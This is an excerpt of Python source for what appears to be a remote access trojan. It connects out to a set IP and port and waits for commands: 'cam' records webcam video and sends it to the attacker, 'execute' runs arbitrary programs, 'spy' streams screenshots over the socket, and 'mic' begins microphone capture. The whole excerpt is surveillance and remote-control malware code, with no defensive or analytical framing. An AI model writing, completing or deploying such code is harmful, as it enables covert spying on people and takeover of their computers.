...
import ctypes
target_ip = "192.168.1.8"  # Replace with your target's IP address
port = 8888  # Choose any port number you want
...
while True:
    ...
    if command.lower() == 'cam':
        ...
        # read the frames and write them to the video file
        while True:
            ret,frame = cap.read()
            out.write(frame)

            # check if the 'q' key was pressed to stop the recording
        ...
        # send the recorded video back to the attacker
        ...
        s.send('Video recording finished.'.encode())
    ...
    if command.lower().startswith("execute"):
        # Get the path to the application to be executed
        app_path = command.split(" ", 1)[1]

        try:
            # Run the application using subprocess
            subprocess.Popen(app_path)
            output = f"{app_path} started successfully."
        except Exception as e:
            output = f"Error starting {app_path}: {str(e)}"
    ...
    if command.lower() == 'spy':
        ...
        while True:
            ...
            im_grabber = ImageGrab.grab()

            # capture the screenshot
            im = im_grabber.resize(screen_size).convert('RGB')

            # save the screenshot to a byte buffer
            buffer = io.BytesIO()
            im.save(buffer, format='JPEG')
            buffer.seek(0)

            # send the screenshot to the target machine
            s.sendall(buffer.read())

            # receive any data sent back from the target machine
    ...
    if command.lower() == 'mic':
        ...
        # Define callback function to record
